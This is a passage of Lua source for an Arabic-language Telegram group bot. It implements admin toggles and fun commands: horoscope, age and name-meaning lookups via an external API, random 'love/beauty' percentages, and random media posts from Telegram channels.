Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Brg:Joker'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الابراج بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Brg:Joker'..msg.chat_id_,true)  
end
if not DevJoker:get(BlAcK..'Joker:Brg:Joker'..msg.chat_id_) then
if text and text:match("^برج (.*)$") and ChCheck(msg) or text and text:match("^برجي (.*)$") and ChCheck(msg) then 
local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
Brg = JSON.decode(UrlBrg) 
t = Brg.ok.abs  
Dev_Joker(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source BlAcK     --
if text and (text == "تفعيل اوامر النسب" or text == "تفعيل نسبه الحب" or text == "تفعيل نسبه الكره" or text == "تفعيل نسبه الرجوله" or text == "تفعيل نسبه الانوثه" or text == "تفعيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل اوامر النسب'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Nsba:Joker'..msg.chat_id_) 
end
if text and (text == "تعطيل اوامر النسب" or text == "تعطيل نسبه الحب" or text == "تعطيل نسبه الكره" or text == "تعطيل نسبه الرجوله" or text == "تعطيل نسبه الانوثه" or text == "تعطيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل اوامر النسب'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Nsba:Joker'..msg.chat_id_,true)  
end
if not DevJoker:get(BlAcK..'Joker:Nsba:Joker'..msg.chat_id_) then
if text == "نسبه الحب" and ChCheck(msg) or text == "نسبة الحب" and ChCheck(msg) then
DevJoker:set(BlAcK..'LoveNsba:Joker'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevJoker:get(BlAcK..'LoveNsba:Joker'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الحب ', 1, 'md')
DevJoker:del(BlAcK..'LoveNsba:Joker'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Joker = math.random(0,100);
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙نسبة الحب بين '..text..' هي : '..Joker..'%', 1, 'md')
DevJoker:del(BlAcK..'LoveNsba:Joker'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevJoker:get(BlAcK..'Joker:Nsba:Joker'..msg.chat_id_) then
if text == "نسبه الخيانه" and ChCheck(msg) or text == "نسبة الخيانه" and ChCheck(msg) or text == "↫ نسبه الخيانه ᥀" and ChCheck(msg) then
DevJoker:set(BlAcK..'RyNsba:Joker'..msg.chat_id_..msg.sender_user_id_,true)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الخيانه بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الخيانه" and text ~= "نسبة الخيانه" and text ~= "↫ نسبه الخيانه ᥀" and DevJoker:get(BlAcK..'RyNsba:Joker'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الخيانه ', 1, 'md')
DevJoker:del(BlAcK..'RyNsba:Joker'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Joker = math.random(0,100);
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙نسبة الخيانه بين '..text..' هي : '..Joker..'%', 1, 'md')
DevJoker:del(BlAcK..'RyNsba:Joker'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevJoker:get(BlAcK..'Joker:Nsba:Joker'..msg.chat_id_) then
if text and (text == "نسبه الجمال" or text == "نسبة الجمال" or text == "↫ نسبه الجمال ᥀") and ChCheck(msg) then
DevJoker:set(BlAcK..'JNsba:Joker'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة جماله كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الجمال" and text ~= "نسبة الجمال" and text ~= "↫ نسبه الجمال ᥀" and DevJoker:get(BlAcK..'JNsba:Joker'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الجمال ', 1, 'md')
DevJoker:del(BlAcK..'JNsba:Joker'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Joker = math.random(0,100);
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙نسبة جمال '..text..' هي : '..Joker..'%', 1, 'md')
DevJoker:del(BlAcK..'JNsba:Joker'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevJoker:get(BlAcK..'Joker:Nsba:Joker'..msg.chat_id_) then
if text == "نسبه الكره" and ChCheck(msg) or text == "نسبة الكره" and ChCheck(msg) or text == "↫ نسبه الكره ᥀" and ChCheck(msg) then
DevJoker:set(BlAcK..'HataNsba:Joker'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and text ~= "↫ نسبه الكره ᥀" and DevJoker:get(BlAcK..'HataNsba:Joker'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الكره ', 1, 'md')
DevJoker:del(BlAcK..'HataNsba:Joker'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Joker = math.random(0,100);
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙نسبة الكره بين '..text..' هي : '..Joker..'%', 1, 'md')
DevJoker:del(BlAcK..'HataNsba:Joker'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevJoker:get(BlAcK..'Joker:Nsba:Joker'..msg.chat_id_) then
if text and (text == "نسبه الرجوله" or text == "نسبة الرجوله" or text == "نسبه رجوله" or text == "نسبة رجوله" or text == "↫ نسبه الرجوله ᥀") and ChCheck(msg) then
DevJoker:set(BlAcK..'RjolaNsba:Joker'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and text ~= "↫ نسبه الرجوله ᥀" and DevJoker:get(BlAcK..'RjolaNsba:Joker'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الرجوله ', 1, 'md')
DevJoker:del(BlAcK..'RjolaNsba:Joker'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Joker = math.random(0,100);
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙نسبة رجولة '..text..' هي : '..Joker..'%', 1, 'md')
DevJoker:del(BlAcK..'RjolaNsba:Joker'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevJoker:get(BlAcK..'Joker:Nsba:Joker'..msg.chat_id_) then
if text and (text == "نسبه الانوثه" or text == "نسبة الانوثه" or text == "نسبه انوثه" or text == "نسبة انوثه" or text == "↫ نسبه الانوثه ᥀") and ChCheck(msg) then
DevJoker:set(BlAcK..'AnothaNsba:Joker'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and text ~= "↫ نسبه الانوثه ᥀" and DevJoker:get(BlAcK..'AnothaNsba:Joker'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الانوثه ', 1, 'md')
DevJoker:del(BlAcK..'AnothaNsba:Joker'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Joker = math.random(0,100);
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙نسبة انوثة '..text..' هي : '..Joker..'%', 1, 'md')
DevJoker:del(BlAcK..'AnothaNsba:Joker'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevJoker:get(BlAcK..'Joker:Nsba:Joker'..msg.chat_id_) then
if text and (text == "نسبه الغباء" or text == "نسبة الغباء" or text == "↫ نسبه الغباء ᥀") and ChCheck(msg) then
DevJoker:set(BlAcK..'StupidNsba:Joker'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and text ~= "↫ نسبه الغباء ᥀" and DevJoker:get(BlAcK..'StupidNsba:Joker'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevJoker:del(BlAcK..'StupidNsba:Joker'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Joker = math.random(0,100);
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙نسبة غباء '..text..' هي : '..Joker..'%', 1, 'md')
DevJoker:del(BlAcK..'StupidNsba:Joker'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
--     Source BlAcK     --
if text == "تفعيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل حساب العمر'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Age:Joker'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل حساب العمر'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Age:Joker'..msg.chat_id_,true)  
end
if not DevJoker:get(BlAcK..'Joker:Age:Joker'..msg.chat_id_) then
if text and text:match("^احسب (.*)$") and ChCheck(msg) or text and text:match("^عمري (.*)$") and ChCheck(msg) then 
local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge) 
t = Age.ok.abs
Dev_Joker(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source BlAcK     --
if text == "تفعيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل معاني الاسماء'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Mean:Joker'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل معاني الاسماء'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Mean:Joker'..msg.chat_id_,true)  
end
if not DevJoker:get(BlAcK..'Joker:Mean:Joker'..msg.chat_id_) then
if text and text:match("^معنى الاسم (.*)$") and SourceCh(msg) or text and text:match("^معنى اسم (.*)$") and SourceCh(msg) then 
local TextMean = text:match("^معنى الاسم (.*)$") or text:match("^معنى اسم (.*)$") 
UrlMean = https.request('https://apiabs.ml/Mean.php?Abs='..URL.escape(TextMean)) 
Mean = JSON.decode(UrlMean) 
t = Mean.ok.abs
Dev_Joker(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source BlAcK     --
if text == "تفعيل متحركه" and Manager(msg) and SourceCh(msg) or text == "تفعيل المتحركه" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل المتحركه'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:gif:Joker'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Manager(msg) and SourceCh(msg) or text == "تعطيل المتحركه" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل المتحركه'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:gif:Joker'..msg.chat_id_,true)  
end
if text and (text == "متحركه" or text == "↫ متحركه ᥀") and not DevJoker:get(BlAcK..'Joker:gif:Joker'..msg.chat_id_) and SourceCh(msg) then
Joker = math.random(2,1075); 
local Text ='*᥀︙تم اختيار المتحركه لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ BlAcK Team .',url="t.me/BLACK_TEAM_4"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/GifBlAcK/'..Joker..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source BlAcK     --
if text == "تفعيل ميمز" and Manager(msg) and SourceCh(msg) or text == "تفعيل الميمز" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الميمز'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:memz:Joker'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Manager(msg) and SourceCh(msg) or text == "تعطيل الميمز" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الميمز'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:memz:Joker'..msg.chat_id_,true)  
end
if text and (text == "ميمز" or text == "↫ ميمز ᥀") and not DevJoker:get(BlAcK..'Joker:memz:Joker'..msg.chat_id_) and SourceCh(msg) then
Joker = math.random(2,1201); 
local Text ='*᥀︙تم اختيار مقطع الميمز لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ BlAcK Team .',url="t.me/BLACK_TEAM_4"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/MemzBlAcK/'..Joker..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source BlAcK     --
if text == "تفعيل غنيلي" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل غنيلي'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Audios:Joker'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل غنيلي'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Audios:Joker'..msg.chat_id_,true)  
end
if text and (text == "غنيلي" or text == "↫ غنيلي ᥀") and not DevJoker:get(BlAcK..'Joker:Audios:Joker'..msg.chat_id_) and SourceCh(msg) then
Joker = math.random(4,2824); 
local Text ='*᥀︙تم اختيار المقطع الصوتي لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ BlAcK Team .',url="t.me/BLACK_TEAM_4"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/AudiosBlAcK/'..Joker..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source BlAcK     --
if text == "تفعيل الاغاني" and Manager(msg) and SourceCh(msg) or text == "تفعيل اغنيه" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الاغاني'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:mp3:Joker'..msg.chat_id_) 
end
if text == "تعطيل الاغاني" and Manager(msg) and SourceCh(msg) or text == "تعطيل اغنيه" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الاغاني'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:mp3:Joker'..msg.chat_id_,true)  
end
if text and (text == "اغنيه" or text == "↫ اغنيه ᥀" or text == "اغاني") and not DevJoker:get(BlAcK..'Joker:mp3:Joker'..msg.chat_id_) and SourceCh(msg) then
Joker = math.random(2,1167); 
local Text ='*᥀︙تم اختيار الاغنيه لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ BlAcK Team .',url="t.me/BLACK_TEAM_4"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/BlAcKMp3/'..Joker..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source BlAcK     --
if text == "تفعيل ريمكس" and Manager(msg) and SourceCh(msg) or text == "تفعيل الريمكس" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الريمكس'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Remix:Joker'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Manager(msg) and SourceCh(msg) or text == "تعطيل الريمكس" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الريمكس'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Remix:Joker'..msg.chat_id_,true)  
end
if text and (text == "ريمكس" or text == "↫ ريمكس ᥀") and not DevJoker:get(BlAcK..'Joker:Remix:Joker'..msg.chat_id_) and SourceCh(msg) then
Joker = math.random(2,612); 
local Text ='*᥀︙تم اختيار الريمكس لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ BlAcK Team .',url="t.me/BLACK_TEAM_4"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/RemixBlAcK/'..Joker..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source BlAcK     --
if text == "تفعيل صوره" and Manager(msg) and SourceCh(msg) or text == "تفعيل الصوره" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الصوره'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Photo:Joker'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Manager(msg) and SourceCh(msg) or text == "تعطيل الصوره" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الصوره'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Photo:Joker'..msg.chat_id_,true)  
end
if text and (text == "صوره" or text == "↫ صوره ᥀") and not DevJoker:get(BlAcK..'Joker:Photo:Joker'..msg.chat_id_) and SourceCh(msg) then
Joker = math.random(4,1171); 
local Text ='*᥀︙تم اختيار الصوره لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ BlAcK Team .',url="t.me/BLACK_TEAM_4"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/PhotosBlAcK/'..Joker..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source BlAcK     --
if text == "تفعيل انمي" and Manager(msg) and SourceCh(msg) or text == "تفعيل الانمي" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الانمي'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Anime:Joker'..msg.chat_id_) 
end
if text == "تعطيل انمي" and Manager(msg) and SourceCh(msg) or text == "تعطيل الانمي" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الانمي'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Anime:Joker'..msg.chat_id_,true)  
end
if text and (text == "انمي" or text == "↫ انمي ᥀") and not DevJoker:get(BlAcK..'Joker:Anime:Joker'..msg.chat_id_) and SourceCh(msg) then
Joker = math.random(3,1002); 
local Text ='*᥀︙تم اختيار صورة الانمي لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ BlAcK Team .',url="t.me/BLACK_TEAM_4"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AnimeBlAcK/'..Joker..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source BlAcK     --
if text == "تفعيل فلم" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل الافلام'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Movies:Joker'..msg.chat_id_) 
end
if text == "تعطيل فلم" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل الافلام'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Movies:Joker'..msg.chat_id_,true)  
end
if text and (text == "فلم" or text == "↫ فلم ᥀") and not DevJoker:get(BlAcK..'Joker:Movies:Joker'..msg.chat_id_) and ChCheck(msg) then
Joker = math.random(45,125); 
local Text ='*᥀︙تم اختيار الفلم لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ BlAcK Team .',url="t.me/BLACK_TEAM_4"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MoviesBlAcK/'..Joker..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source BlAcK     --
if text == "تفعيل مسلسل" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل المسلسلات'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK..'Joker:Series:Joker'..msg.chat_id_) 
end
if text == "تعطيل مسلسل" and Manager(msg) and SourceCh(msg) then
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل المسلسلات'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK..'Joker:Series:Joker'..msg.chat_id_,true)  
end
if text and (text == "مسلسل" or text == "↫ مسلسل ᥀") and not DevJoker:get(BlAcK..'Joker:Series:Joker'..msg.chat_id_) and SourceCh(msg) then
Joker = math.random(2,54); 
local Text ='*᥀︙تم اختيار المسلسل لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ BlAcK Team .',url="t.me/BLACK_TEAM_4"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SeriesBlAcK/'..Joker..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source BlAcK     --
if Admin(msg) then
if DevJoker:get(BlAcK..'Joker:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if DevJoker:get(BlAcK..'Joker:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙الروابط ↫ "..mute_links.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevJoker:get(BlAcK..'Joker:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙المعرف ↫ "..lock_tag.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevJoker:get(BlAcK..'Joker:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local BlAcKTeam = "\n" .."᥀︙المتحركه ↫ "..mute_gifs.."\n" Dev_Joker(msg.chat_id_, msg.id_, 1, BlAcKTeam, 1, 'md') end
